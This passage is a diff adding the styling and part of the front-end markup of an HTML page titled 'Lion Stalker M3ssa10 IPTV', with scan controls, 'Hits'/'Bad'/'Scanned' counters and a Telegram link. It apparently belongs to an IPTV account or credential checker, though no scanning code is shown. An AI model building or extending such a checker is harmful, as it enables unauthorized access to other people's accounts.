@@ -1,0 +1,2813 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>🦁 ꪶⅈꪮꪀ ડ𝕥ꪖꪶ𝕜ꫀ𝕣 ꪑ𝟛ડડꪖ𝟙𝟘 🦁</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=Orbitron:wght@400;600;800&family=Cormorant+Garamond:wght@400;600;700&family=Playfair+Handwritten:wght@400;600&display=swap" rel="stylesheet">
+  
+  <link href="https://fonts.googleapis.com/css2?family=Monoton&family=Bungee&family=Cinzel+Decorative:wght@700&family=Inter&family=Rajdhani:wght@400;600&family=Cormorant+Garamond:wght@500;700&display=swap" rel="stylesheet">
+  
+  <style>
+/* ===============================
+   VARIABLES BASE
+================================ */
+:root {
+  --bg-main: #2b2b33;
+  --bg-main-2: #3a3a47;
+  --bg-card: #3f3f50;
+
+  --text-main: #f0f0f3;
+  --text-soft: #c7c7c9;
+
+  --accent-primary: #d4af37;
+  --accent-secondary: #bda4ff;
+  --accent-border: #b8962f;
+  --accent-mint: #7df2d8;
+
+  --border-soft: #4a4a4f;
+}
+
+/* ===============================
+   RESET / BASE
+================================ */
+* {
+  box-sizing: border-box;
+}
+
+body {
+  margin: 0;
+  background: linear-gradient(
+    180deg,
+    var(--bg-main),
+    var(--bg-main-2)
+  );
+  color: var(--text-main);
+  font-family: inherit;
+}
+
+/* ===============================
+   CONTENEDOR PRINCIPAL
+================================ */
+.main-card {
+  background: var(--bg-card);
+  border-radius: 22px;
+  padding: 22px;
+  margin: 16px;
+
+  border: 2px solid var(--accent-border);
+  box-shadow:
+    0 0 25px rgba(0,0,0,0.6),
+    inset 0 0 40px rgba(0,0,0,0.35);
+}
+
+/* ===============================
+   HEADER / TITULOS
+================================ */
+.header-title {
+  width: 100%;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+
+  text-align: center;
+  margin-bottom: 22px;
+}
+
+.glam-heading {
+  width: 100%;
+  margin: 0 0 12px 0;
+  padding: 0;
+
+  text-align: center;
+  font-weight: 900;
+  letter-spacing: 2px;
+  text-transform: uppercase;
+
+  color: var(--accent-primary);
+  text-shadow:
+    0 0 12px var(--accent-primary),
+    0 0 32px rgba(255,255,255,0.15);
+}
+
+/* ===============================
+   IMAGEN PRINCIPAL
+================================ */
+.image-container {
+  position: relative;
+  width: 100%;
+
+  aspect-ratio: 16 / 9;
+  max-height: 420px;
+
+  overflow: hidden;
+  border-radius: 18px;
+  margin-bottom: 26px;
+
+  border: 2px solid var(--accent-primary);
+  box-shadow:
+    0 0 25px var(--accent-primary),
+    inset 0 0 30px rgba(0,0,0,0.4);
+}
+
+.image-container img {
+  width: 100%;
+  height: 100%;
+
+  display: block;
+  object-fit: cover;
+  object-position: center;
+}
+
+/* ===============================
+   TEXTO / CONTENIDO
+================================ */
+.section-text {
+  color: var(--text-soft);
+  line-height: 1.6;
+  margin-bottom: 16px;
+}
+
+/* ===============================
+   BOTONES
+================================ */
+.btn {
+  padding: 12px 22px;
+  border-radius: 14px;
+  border: none;
+  cursor: pointer;
+
+  font-weight: 700;
+  letter-spacing: 1px;
+
+  background: linear-gradient(
+    135deg,
+    var(--accent-primary),
+    var(--accent-secondary)
+  );
+
+  color: #000;
+  box-shadow:
+    0 0 18px var(--accent-primary),
+    inset 0 0 12px rgba(255,255,255,0.25);
+
+  transition: all 0.25s ease;
+}
+
+.btn:hover {
+  transform: translateY(-2px) scale(1.03);
+  box-shadow:
+    0 0 28px var(--accent-primary),
+    inset 0 0 16px rgba(255,255,255,0.35);
+}
+
+/* ===============================
+   SELECT / INPUT
+================================ */
+select,
+input {
+  width: 100%;
+  padding: 12px 14px;
+
+  background: var(--bg-main-2);
+  color: var(--text-main);
+
+  border-radius: 12px;
+  border: 2px solid var(--border-soft);
+
+  outline: none;
+}
+
+select:focus,
+input:focus {
+  border-color: var(--accent-primary);
+  box-shadow: 0 0 12px var(--accent-primary);
+}
+
+/* ===============================
+   TEMAS (DATA-THEME)
+================================ */
+body[data-theme="black-titanium"] .main-card {
+  box-shadow:
+    0 0 35px #00ffe0,
+    inset 0 0 50px rgba(0,0,0,0.5);
+}
+
+body[data-theme="dark-gold"] .main-card {
+  box-shadow:
+    0 0 35px #ffd700,
+    inset 0 0 50px rgba(0,0,0,0.5);
+}
+
+/* ===============================
+   RESPONSIVE
+================================ */
+@media (max-width: 600px) {
+
+  .main-card {
+    padding: 16px;
+    margin: 10px;
+  }
+
+  .image-container {
+    aspect-ratio: 4 / 3;
+    max-height: 280px;
+  }
+
+  .glam-heading {
+    font-size: 1.3rem;
+  }
+}
+
+/* ===============================
+   TIPOGRAFÍAS POR TEMA
+================================ */
+
+/* ====== TEMA 1 · PEARL CARBON ====== */
+body[data-theme="pearl-carbon"] {
+  font-family: 'Inter', sans-serif;
+}
+
+body[data-theme="pearl-carbon"] .glam-heading,
+body[data-theme="pearl-carbon"] h3 {
+  font-family: 'Monoton', cursive;
+  font-weight: 400;
+  letter-spacing: 2px;
+}
+
+/* ====== TEMA 2 · BLACK TITANIUM ====== */
+body[data-theme="black-titanium"] {
+  font-family: 'Rajdhani', sans-serif;
+}
+
+body[data-theme="black-titanium"] .glam-heading,
+body[data-theme="black-titanium"] h3 {
+  font-family: 'Bungee', cursive;
+  font-weight: 400;
+  letter-spacing: 1.5px;
+}
+
+/* ====== TEMA 3 · DARK GOLD EXECUTIVE ====== */
+body[data-theme="dark-gold"] {
+  font-family: 'Cormorant Garamond', serif;
+}
+
+body[data-theme="dark-gold"] .glam-heading,
+body[data-theme="dark-gold"] h3 {
+  font-family: 'Cinzel Decorative', serif;
+  font-weight: 700;
+  letter-spacing: 1px;
+}
+
+/* ===============================
+   TEXTO GENERAL
+================================ */
+.section-text,
+p,
+span,
+label,
+input,
+select,
+button {
+  font-family: inherit;
+}
+
+/* ===============================
+   BOTONES SUPERIORES ELEGANTES
+================================ */
+
+.control-buttons {
+  display: flex;
+  justify-content: center;
+  gap: 14px;
+  margin: 18px 0 26px;
+  flex-wrap: wrap;
+}
+
+/* BASE */
+.control-buttons button {
+  min-width: 160px;
+  padding: 12px 22px;
+  border-radius: 999px;
+
+  font-size: 14px;
+  font-weight: 800;
+  letter-spacing: 1px;
+  text-transform: uppercase;
+
+  border: none;
+  cursor: pointer;
+  transition: all 0.3s ease;
+
+  box-shadow: 0 8px 20px rgba(0,0,0,0.35);
+}
+
+/* START */
+.btn-primary {
+  background: linear-gradient(
+    135deg,
+    var(--accent-gold),
+    var(--accent-lilac)
+  );
+  color: #fff;
+}
+
+.btn-primary:hover:not(:disabled) {
+  transform: translateY(-2px);
+  filter: brightness(1.1);
+}
+
+/* STOP */
+.btn-danger {
+  background: linear-gradient(
+    135deg,
+    #ff4b4b,
+    #b30000
+  );
+  color: #fff;
+}
+
+.btn-danger:hover:not(:disabled) {
+  transform: translateY(-2px);
+  filter: brightness(1.1);
+}
+
+/* SAVE */
+.btn-secondary {
+  background: linear-gradient(
+    135deg,
+    #5f5f6a,
+    #2f2f35
+  );
+  color: #eee;
+}
+
+.btn-secondary:hover {
+  transform: translateY(-2px);
+  filter: brightness(1.1);
+}
+
+/* DISABLED */
+.control-buttons button:disabled {
+  opacity: 0.45;
+  cursor: not-allowed;
+  transform: none;
+  box-shadow: none;
+}
+
+/* ===============================
+   SCAN STATUS PANEL
+================================ */
+
+.scan-status-box {
+  margin: 0 auto 30px;
+  padding: 18px 20px;
+  max-width: 560px;
+
+  background: linear-gradient(
+    135deg,
+    var(--bg-card),
+    var(--bg-main)
+  );
+
+  border-radius: 18px;
+  border: 1px solid var(--border-soft);
+
+  box-shadow:
+    0 10px 28px rgba(0,0,0,0.45),
+    inset 0 0 20px rgba(255,255,255,0.03);
+}
+
+/* TOP INFO */
+.scan-info {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+
+  font-size: 13px;
+  font-weight: 700;
+  color: var(--text-soft);
+
+  margin-bottom: 12px;
+}
+
+.scan-info strong {
+  color: var(--text-main);
+}
+
+/* PROGRESS */
+.progress-bar {
+  width: 100%;
+  height: 14px;
+  background: #18181d;
+  border-radius: 999px;
+  overflow: hidden;
+
+  box-shadow: inset 0 3px 6px rgba(0,0,0,0.7);
+  margin-bottom: 14px;
+}
+
+.progress-fill {
+  height: 100%;
+  width: 0%;
+  border-radius: 999px;
+
+  background: linear-gradient(
+    90deg,
+    var(--accent-gold),
+    var(--accent-mint),
+    var(--accent-lilac)
+  );
+
+  transition: width 0.35s ease;
+}
+
+/* COUNTERS */
+.scan-counters {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 14px;
+  margin-bottom: 14px;
+}
+
+.counter {
+  padding: 10px 8px;
+  text-align: center;
+  border-radius: 12px;
+
+  font-size: 12px;
+  font-weight: 700;
+
+  background: rgba(0,0,0,0.35);
+  box-shadow: inset 0 0 8px rgba(0,0,0,0.6);
+}
+
+.counter strong {
+  display: block;
+  margin-top: 4px;
+  font-size: 16px;
+}
+
+/* COLOR POR TIPO */
+.counter.hit strong { color: #4cff9b; }
+.counter.bad strong { color: #ff5c5c; }
+.counter.scan strong { color: var(--accent-gold); }
+
+/* FOOTER */
+.scan-footer {
+  margin-top: 10px;
+  text-align: center;
+
+  font-size: 11px;
+  font-weight: 600;
+  letter-spacing: 1px;
+
+  color: var(--text-soft);
+  opacity: 0.75;
+}
+
+/* ===============================
+   CONFIG PANEL LAYOUT MODIFICADO
+================================ */
+
+/* Contenedor superior de paneles lado a lado */
+.top-row {
+  display: flex;
+  gap: 20px;
+  width: 100%;
+  flex-wrap: wrap; /* responsive */
+  align-items: flex-start; /* alinear arriba */
+}
+
+/* Panel izquierdo (configuración del scan) */
+.panel-left {
+  flex: 1;          /* ocupa la mitad de la fila superior */
+  min-width: 280px;
+  padding: 16px;
+  background: var(--bg-card);
+  border-radius: 12px;
+  box-shadow: 0 6px 18px rgba(0,0,0,0.2);
+
+  /* scroll interno si hay demasiado contenido */
+  max-height: 80vh;
+  overflow-y: auto;
+
+  font-size: 14px;
+  line-height: 1.4;
+}
+
+/* Panel derecho (categorías, separadores, etc) */
+.panel-right {
+  flex: 1;
+  min-width: 280px;
+  padding: 16px;
+  background: var(--bg-card);
+  border-radius: 12px;
+  box-shadow: 0 6px 18px rgba(0,0,0,0.2);
+
+  max-height: 80vh;
+  overflow-y: auto;
+
+  font-size: 14px;
+  line-height: 1.4;
+}
+
+/* Panel inferior, ocupa todo el ancho, para emojis y personalización de salida */
+.panel-bottom {
+  width: 100%;
+  padding: 16px;
+  background: var(--bg-card);
+  border-radius: 12px;
+  box-shadow: 0 6px 18px rgba(0,0,0,0.2);
+  margin-top: 20px;
+
+  /* aumentar altura para que se vea todo */
+  max-height: 70vh; 
+  overflow-y: auto;
+
+  font-size: 14px;
+  line-height: 1.4;
+}
+
+/* ===============================
+   FLEX ROW / COL PARA INPUTS Y SELECTS
+================================ */
+.flex-row {
+  display: flex;
+  gap: 10px;
+  margin-bottom: 12px;
+  flex-wrap: wrap;
+}
+
+.flex-col {
+  flex: 1 1 140px; /* mínimo ancho 140px, se expande */
+  display: flex;
+  flex-direction: column;
+}
+
+/* ===============================
+   EMOJI SELECT
+================================ */
+.emoji-select {
+  padding: 6px 10px;
+  border-radius: 8px;
+  border: 1px solid var(--border-soft);
+  background: var(--bg-main-2);
+  color: var(--text-main);
+  font-size: 13px; /* tamaño más uniforme */
+  line-height: 1.3;
+}
+
+/* =====================================
+   FORZAR CENTRADO PANEL INFERIOR (FIX)
+===================================== */
+
+.panel-bottom h3 {
+  display: block !important;
+  width: 100% !important;
+
+  text-align: center !important;
+  margin-left: auto !important;
+  margin-right: auto !important;
+
+  margin-bottom: 18px;
+  padding-bottom: 10px;
+
+  font-weight: 800;
+  letter-spacing: 1.5px;
+  text-transform: uppercase;
+
+  color: var(--accent-primary);
+  border-bottom: 1px solid var(--border-soft);
+}
+
+
+/* =====================================================
+   SEGURIDAD ANTI-CORTE (clave)
+   ===================================================== */
+.panel{
+  min-width: 0;
+  max-height: none !important;
+  overflow: visible !important;
+}
+
+/* =====================================================
+   TITULOS CENTRADOS (sin romper otros h3)
+   ===================================================== */
+.panel-title-center{
+  text-align: center;
+  margin: 0 0 12px;
+}
+
+/* ===== BUSCADOR EN PANEL IZQUIERDO (2 columnas) ===== */
+.scan-split{
+  margin-top: 16px;
+  padding-top: 14px;
+  border-top: 1px solid var(--border-soft);
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 14px;
+  width: 100%;
+}
+
+.scan-side{
+  background: rgba(0,0,0,0.18);
+  border: 1px solid var(--border-soft);
+  border-radius: 14px;
+  padding: 12px;
+  min-width: 0;
+}
+
+.mini-title{
+  margin: 0 0 10px;
+  font-weight: 900;
+  letter-spacing: 1px;
+  color: var(--accent-primary);
+  text-transform: uppercase;
+}
+
+.scan-side textarea{
+  width: 100%;
+  padding: 12px 14px;
+  background: var(--bg-main-2);
+  color: var(--text-main);
+  border-radius: 12px;
+  border: 2px solid var(--border-soft);
+  outline: none;
+  resize: vertical;
+}
+
+.scan-side textarea:focus{
+  border-color: var(--accent-primary);
+  box-shadow: 0 0 12px var(--accent-primary);
+}
+
+.mini-actions{
+  display: flex;
+  gap: 10px;
+  margin-top: 10px;
+  flex-wrap: wrap;
+}
+
+.mini-output{
+  margin-top: 12px;
+  padding: 12px;
+  border-radius: 12px;
+  border: 1px solid var(--border-soft);
+  background: rgba(0,0,0,0.25);
+  font-size: 13px;
+  line-height: 1.45;
+  white-space: pre-wrap;
+  max-height: 260px;
+  overflow: auto;
+}
+
+.mini-note{
+  margin-top: 10px;
+  font-size: 12px;
+  color: var(--text-soft);
+  opacity: 0.9;
+}
+
+/* Responsive */
+@media (max-width: 900px){
+  .scan-split{ grid-template-columns: 1fr; }
+}
+
+/* =========================================
+   PANEL ENLACE + PALABRAS / CARPETA RESULTADOS
+   UNIFICAR TIPOGRAFÍA Y ESTILO
+========================================= */
+
+/* Heredar tipografía global */
+.scan-split,
+.scan-side,
+.scan-side * {
+  font-family: inherit !important;
+  color: var(--text-main) !important;
+  letter-spacing: 0.5px;
+}
+
+/* Títulos */
+.scan-side h4,
+.mini-title {
+  font-size: 15px;
+  font-weight: 800;
+  text-transform: uppercase;
+  color: var(--accent-primary) !important;
+  margin-bottom: 12px;
+}
+
+/* Labels */
+.scan-side label {
+  font-size: 13px;
+  font-weight: 700;
+  color: var(--text-main);
+  margin-bottom: 6px;
+}
+
+/* Inputs y textarea */
+.scan-side input,
+.scan-side textarea {
+  font-size: 14px;
+  font-weight: 600;
+  background: var(--bg-main-2);
+  color: var(--text-main);
+  border: 1px solid var(--border-soft);
+}
+
+/* Placeholder */
+.scan-side input::placeholder,
+.scan-side textarea::placeholder {
+  color: var(--text-soft);
+  opacity: 0.7;
+}
+
+/* Botones */
+.scan-side .utility-btn {
+  font-size: 13px;
+  font-weight: 800;
+  text-transform: uppercase;
+  background: linear-gradient(
+    135deg,
+    var(--accent-primary),
+    var(--accent-secondary)
+  );
+  color: #000 !important;
+  border-radius: 10px;
+  border: none;
+  box-shadow: 0 4px 12px rgba(0,0,0,0.4);
+}
+
+/* Hover botones */
+.scan-side .utility-btn:hover {
+  transform: translateY(-1px);
+  filter: brightness(1.1);
+}
+
+/* Caja de resultados */
+.mini-output {
+  font-family: inherit;
+  font-size: 13px;
+  font-weight: 600;
+  color: var(--text-main);
+  background: rgba(0,0,0,0.35);
+  border: 1px solid var(--border-soft);
+}
+
+/* Texto aviso */
+.mini-note {
+  font-size: 12px;
+  font-weight: 600;
+  color: var(--text-soft);
+  opacity: 0.85;
+}
+
+/* ---- Panel layout interno (mismo look que AJUSTES) ---- */
+.panel-title{
+  font-size: 28px;
+  font-weight: 900;
+  letter-spacing: .6px;
+  color: #fff;
+  margin-bottom: 12px;
+  text-shadow: 0 2px 10px rgba(0,0,0,.35);
+}
+
+.panel-body{
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+}
+
+/* ---- Form fields consistentes ---- */
+.field{ display:flex; flex-direction:column; gap:6px; }
+
+.field-label{
+  font-weight: 800;
+  letter-spacing: .4px;
+  color: rgba(255,255,255,.90);
+}
+
+/* Input que hereda tu tipografía global */
+.input{
+  width: 100%;
+  padding: 10px 12px;
+  background: #0d1117;
+  color: #c9d1d9;
+  border: 1px solid #30363d;
+  border-radius: 8px;
+  font: inherit;
+  outline: none;
+}
+
+.input:focus{
+  border-color: rgba(255,255,255,.25);
+  box-shadow: 0 0 0 3px rgba(255,255,255,.08);
+}
+
+/* Botón ocupar ancho */
+.btn-wide{ width: 100%; }
+
+/* Result box con estilo de panel */
+.panel-result{
+  border: 1px solid rgba(255,255,255,.10);
+  border-radius: 10px;
+  background: rgba(0,0,0,.25);
+  padding: 12px;
+}
+
+/* SCAN STATUS en 2 columnas */
+.status-row{
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 18px;
+  width: 100%;
+  align-items: start;
+}
+
+/* Móvil: 1 columna */
+@media (max-width: 900px){
+  .status-row{ grid-template-columns: 1fr; }
+}
+
+/* Tarjetas de resumen dentro del panel derecho */
+#hitsSummaryBox .summary-item{
+  padding: 10px 12px;
+  border-radius: 12px;
+  border: 1px solid rgba(255,255,255,.10);
+  background: rgba(0,0,0,.22);
+  margin-bottom: 10px;
+}
+
+#hitsSummaryBox .summary-top{
+  display:flex;
+  justify-content: space-between;
+  gap: 10px;
+  font-weight: 800;
+}
+
+#hitsSummaryBox .summary-meta{
+  margin-top: 6px;
+  font-size: 13px;
+  color: var(--text-soft);
+  line-height: 1.35;
+}
+
+.summary-empty{
+  color: var(--text-soft);
+  opacity: .9;
+}
+
+/* ===============================
+   2 PANELES ARRIBA 50/50
+================================ */
+.status-row{
+  display: flex;
+  gap: 20px;
+  align-items: stretch;
+  width: 100%;
+  margin: 0 auto 30px;
+}
+
+/* OJO: tus .scan-status-box tienen max-width y margin auto.
+   Aquí los anulamos SOLO en esta fila */
+.status-row > .scan-status-box{
+  flex: 1 1 0;
+  width: 0;              /* fuerza reparto exacto */
+  min-width: 0;          /* evita que uno empuje al otro */
+  max-width: none;       /* QUITA el max-width:560px */
+  margin: 0;             /* QUITA el margin:auto */
+}
+
+/* iguala altura visual de ambos */
+.status-row > .scan-status-box{
+  min-height: 240px;     /* ajusta a gusto */
+}
+
+/* responsive */
+@media (max-width: 900px){
+  .status-row{ flex-direction: column; }
+  .status-row > .scan-status-box{
+    width: 100%;
+  }
+}
+
+#hitsSummaryBox{
+  max-height: 220px;
+  overflow: auto;
+}
+
+/* ==============================
+   OPCIÓN C: Estilo salida TXT (Panel izquierdo)
+   ============================== */
+.txt-theme-box{
+  margin-top: 14px;
+  padding: 12px;
+  border-radius: 14px;
+  background: rgba(255,255,255,.06);
+  border: 1px solid rgba(255,255,255,.10);
+  box-shadow: inset 0 0 0 1px rgba(0,0,0,.15);
+}
+
+.txt-theme-head{
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  gap: 10px;
+  margin-bottom: 10px;
+}
+
+.txt-theme-title{
+  font-weight: 700;
+  color: var(--text-main);
+  letter-spacing: .2px;
+}
+
+.txt-theme-badge{
+  padding: 4px 10px;
+  border-radius: 999px;
+  font-size: 12px;
+  font-weight: 800;
+  text-transform: uppercase;
+  letter-spacing: .6px;
+  color: var(--text-main);
+  background: rgba(0,0,0,.25);
+  border: 1px solid rgba(255,255,255,.14);
+}
+
+.txt-theme-row{
+  display:flex;
+  gap: 10px;
+  align-items:center;
+}
+
+.txt-theme-select{
+  flex: 1;
+  min-width: 0;
+  height: 40px;
+  border-radius: 12px;
+  padding: 0 12px;
+  border: 1px solid rgba(255,255,255,.14);
+  background: rgba(0,0,0,.18);
+  color: var(--text-main);
+  outline: none;
+}
+
+.txt-theme-select:focus{
+  border-color: var(--accent-primary);
+  box-shadow: 0 0 0 3px rgba(255,215,0,.12);
+}
+
+.txt-theme-btn{
+  height: 40px;
+  padding: 0 14px;
+  border-radius: 12px;
+  border: 1px solid rgba(255,255,255,.14);
+  background: rgba(0,0,0,.18);
+  color: var(--text-main);
+  font-weight: 800;
+  cursor: pointer;
+}
+
+.txt-theme-btn:active{
+  transform: translateY(1px);
+}
+
+.txt-theme-preview{
+  margin-top: 10px;
+  padding: 10px 12px;
+  border-radius: 12px;
+  border: 1px dashed rgba(255,255,255,.18);
+  background: rgba(0,0,0,.18);
+  color: var(--text-soft);
+  font-size: 12.5px;
+  line-height: 1.35;
+  max-height: 110px;
+  overflow: auto;
+  white-space: pre-wrap;
+}
+/* ====== TXT THEME BOX (OPCIÓN C) ====== */
+.txt-theme-box{
+  margin-top: 14px;
+  padding: 14px;
+  border-radius: 16px;
+  background: rgba(255,255,255,0.06);
+  border: 1px solid rgba(255,255,255,0.10);
+}
+
+.txt-theme-head{
+  display:flex;
+  align-items:center;
+  justify-content: space-between;
+  gap: 10px;
+  margin-bottom: 10px;
+}
+
+.txt-theme-title{
+  font-weight: 800;
+}
+
+.txt-theme-badge{
+  padding: 6px 10px;
+  border-radius: 999px;
+  font-size: 12px;
+  border: 1px solid rgba(255,255,255,0.16);
+  background: rgba(0,0,0,0.25);
+}
+
+.txt-theme-row{
+  display:flex;
+  gap: 10px;
+  align-items:center;
+}
+
+.txt-theme-select{
+  flex: 1 1 auto;
+  min-width: 0;
+}
+
+.txt-theme-btn{
+  flex: 0 0 auto;
+  white-space: nowrap;
+}
+
+.txt-theme-preview{
+  margin-top: 10px;
+  padding: 10px;
+  border-radius: 12px;
+  background: rgba(0,0,0,0.20);
+  border: 1px solid rgba(255,255,255,0.10);
+  font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+  font-size: 12px;
+  line-height: 1.25;
+  max-height: 150px;
+  overflow: auto;
+}
+
+/* ✅ MÓVIL: no se oculta, no se solapa y botones a 100% */
+@media (max-width: 560px){
+  .scan-status-box{
+    overflow: visible !important; /* evita que recorte el selector */
+  }
+
+  .txt-theme-row{
+    flex-direction: column;
+    align-items: stretch;
+  }
+
+  .txt-theme-btn{
+    width: 100%;
+  }
+}
+/* =========================
+   FIX SOLAPE PANEL IZQ/DER (MÓVIL)
+   ========================= */
+
+/* Base: que nunca se monten */
+.status-row{
+  display: flex !important;
+  gap: 16px;
+  align-items: stretch;
+}
+
+/* Cada panel ocupa su espacio real */
+.status-row > *{
+  position: relative !important;
+  z-index: 1;
+  min-width: 0;
+  transform: none !important;
+}
+
+/* Evita que algún panel flote/sea absoluto */
+.scan-status-box,
+.hits-summary-box,
+.hits-box,
+.summary-box,
+.status-box{
+  position: relative !important;
+  float: none !important;
+  clear: both !important;
+}
+
+/* ✅ MÓVIL: apila (uno debajo del otro) */
+@media (max-width: 900px){
+  .status-row{
+    flex-direction: column !important;
+  }
+
+  .scan-status-box,
+  .hits-summary-box,
+  .hits-box,
+  .summary-box{
+    width: 100% !important;
+  }
+
+  /* espacio extra entre paneles por si algún tema mete sombras */
+  .hits-summary-box,
+  .hits-box,
+  .summary-box{
+    margin-top: 14px !important;
+  }
+}
+
+/* Si algún contenedor estaba recortando */
+.scan-status-box{
+  overflow: visible !important;
+  height: auto !important;
+  max-height: none !important;
+}
+/* =========================
+   FIX MARTILLO: evitar solapes entre panel izq y der
+   Pegar AL FINAL del CSS
+   ========================= */
+
+/* La fila de paneles: siempre sin superposiciones */
+.status-row{
+  display: flex !important;
+  gap: 16px !important;
+  align-items: flex-start !important;
+  flex-wrap: wrap !important;        /* permite bajar si no cabe */
+  position: relative !important;
+  overflow: visible !important;
+}
+
+/* Hijos directos de status-row (los dos paneles) */
+.status-row > *{
+  position: relative !important;     /* mata absolute heredado */
+  top: auto !important;
+  left: auto !important;
+  right: auto !important;
+  bottom: auto !important;
+  transform: none !important;        /* mata “subidas” por transform */
+  margin-top: 0 !important;          /* mata márgenes negativos */
+  z-index: 0 !important;
+}
+
+/* Panel izquierdo y derecho en desktop 50/50 sin invadir */
+.status-row > *{
+  flex: 1 1 420px !important;        /* 2 columnas si cabe, si no, baja */
+  min-width: 320px !important;
+}
+
+/* Tu selector TXT: nunca puede quedar tapado */
+.txt-theme-box{
+  position: relative !important;
+  z-index: 10 !important;
+  margin-bottom: 18px !important;
+}
+
+/* El panel derecho: sin comportamiento “flotante” */
+.hits-summary-box,
+.hits-summary-panel,
+.hits-panel,
+.summary-panel,
+.panel-right{
+  position: relative !important;
+  transform: none !important;
+  margin-top: 0 !important;
+  z-index: 1 !important;
+}
+
+/* Móvil: SIEMPRE en columna (uno debajo del otro) */
+@media (max-width: 900px){
+  .status-row{
+    flex-direction: column !important;
+  }
+  .status-row > *{
+    width: 100% !important;
+    min-width: 0 !important;
+  }
+}
+/* =========================================
+   RESUMEN HITS: tamaño inteligente
+   ========================================= */
+
+/* Panel resumen base */
+.hits-summary-box,
+.hits-summary-panel,
+.summary-panel{
+  min-height: 140px !important;   /* compacto por defecto */
+  max-height: 320px !important;   /* límite razonable */
+  overflow-y: auto !important;
+  transition: min-height .25s ease, max-height .25s ease;
+}
+
+/* Cuando está vacío (mensaje “Aún no hay hits…”) */
+.hits-summary-box:has(.summary-empty),
+.summary-panel:has(.summary-empty){
+  min-height: 120px !important;
+  max-height: 160px !important;
+}
+
+/* Cuando YA HAY HITS → se expande */
+.hits-summary-box:has(.summary-item),
+.summary-panel:has(.summary-item){
+  min-height: 220px !important;
+  max-height: 420px !important;
+}
+
+/* El contenedor interno no fuerza altura */
+.hits-summary-box > *,
+.summary-panel > *{
+  flex-grow: 0 !important;
+}
+
+/* Móvil: aún más compacto */
+@media (max-width: 768px){
+  .hits-summary-box,
+  .summary-panel{
+    min-height: 110px !important;
+    max-height: 260px !important;
+  }
+}
+
+/* ============================
+   PROGRESS BAR + 🦁 THUMB
+   ============================ */
+
+.progress-bar{
+  position: relative;
+  height: 14px;
+  border-radius: 999px;
+  background: rgba(255,255,255,.10);
+  overflow: visible;               /* para que el 🦁 no se recorte */
+  box-shadow: inset 0 0 0 1px rgba(255,255,255,.12);
+}
+
+.progress-fill{
+  position: absolute;
+  left: 0;
+  top: 0;
+  height: 100%;
+  width: 0%;
+  border-radius: 999px;
+  background: linear-gradient(90deg, rgba(0,255,224,.95), rgba(0,102,255,.95));
+  transition: width .12s linear;
+}
+
+/* Texto % centrado */
+.progress-label{
+  position: absolute;
+  inset: 0;
+  display: grid;
+  place-items: center;
+  font-size: 11px;
+  font-weight: 700;
+  letter-spacing: .3px;
+  color: rgba(255,255,255,.90);
+  text-shadow: 0 1px 2px rgba(0,0,0,.55);
+  pointer-events: none;
+}
+
+/* 🦁 “thumb” al final del progreso */
+.progress-fill::after{
+  content: "🦁";
+  position: absolute;
+  top: 50%;
+  transform: translateY(-55%);
+  font-size: 18px;
+  line-height: 1;
+  filter: drop-shadow(0 2px 6px rgba(0,0,0,.55));
+  pointer-events: none;
+  opacity: 1;
+  right: -10px; /* al final del fill */
+}
+
+/* ✅ cuando está al 0% el león se queda al inicio */
+.progress-fill[data-p="0"]::after{
+  right: auto;
+  left: -6px;
+}
+
+  </style>
+</head>
+<body>
+
+<div class="theme-selector">
+  <label for="theme">🎨 Tema:</label>
+  <select id="theme">
+    <option value="pearl-carbon">Pearl Carbon</option>
+    <option value="black-titanium">Black Titanium</option>
+    <option value="dark-gold">Dark Gold Executive</option>
+  </select>
+</div>
+
+<!-- ===== HEADER / TITULOS ===== -->
+<div class="header-title">
+  <h1 class="glam-heading top-heading">
+    ꪶⅈꪮꪀ ꪑ𝟛ડડꪖ𝟙𝟘 <br>🄼3🅂🅂🄰10 🄸🄿🅃🅅
+  </h1>
+</div>
+
+<!-- ===== IMAGEN ===== -->
+<div class="image-container">
+  <a href="http://t.me/+knGWqSfahTxkZTVk" target="_blank">
+    <img src="https://i.ibb.co/3YyGY9fY/DAVINCI-1762462204609.jpg" alt="Telegram Channel Link">
+  </a>
+</div>
+
+<!-- ===== SUBTITULO ===== -->
+<h2 class="glam-heading bottom-heading">
+  🦁 ᘻ3SSᗩ10 🦁<br>ꪶⅈꪮꪀ ડ𝕥ꪖꪶ𝕜ꫀ𝕣
+</h2>
+
+<!-- ===== BOTONES DE CONTROL ===== -->
+<div class="control-buttons">
+  <button id="startBtn" class="btn-primary" onclick="iniciarScan()">▶️ START SCAN</button>
+  <button id="stopBtn" class="btn-danger" onclick="pararScan()" disabled>🛑 STOP SCAN</button>
+  <button class="btn-secondary" onclick="enviarTodosHits()">🗳 SAVE HITS</button>
+</div>
+
+<hr class="divider">
+
+<!-- ===== SCAN STATUS: IZQ + RESUMEN HITS: DER ===== -->
+<div class="status-row">
+
+  <!-- IZQUIERDA: TU PANEL (igual) -->
+<div class="scan-status-box">
+  <div class="scan-info">
+    <span>
+      🔄 Status:
+      <strong id="scanStatusText">Idle</strong>
+    </span>
+
+    <span>
+      ⚡ Speed:
+      <strong id="scanSpeed">0</strong>/s
+    </span>
+  </div>
+
+  <div class="progress-bar">
+  <div class="progress-fill" id="scanProgress"></div>
+  <div class="progress-label" id="scanPercentText">0.0%</div>
+</div>
+
+  <div class="scan-counters">
+    <div class="counter hit">
+      ✅ Hits
+      <strong id="hitsCount">0</strong>
+    </div>
+
+    <div class="counter bad">
+      ❌ Bad
+      <strong id="badCount">0</strong>
+    </div>
+
+    <div class="counter scan">
+      🔢 Scanned
+      <strong>
+        <span id="scannedCount">0</span> /
+        <span id="totalCount">0</span>
+      </strong>
+    </div>
+  </div>
+
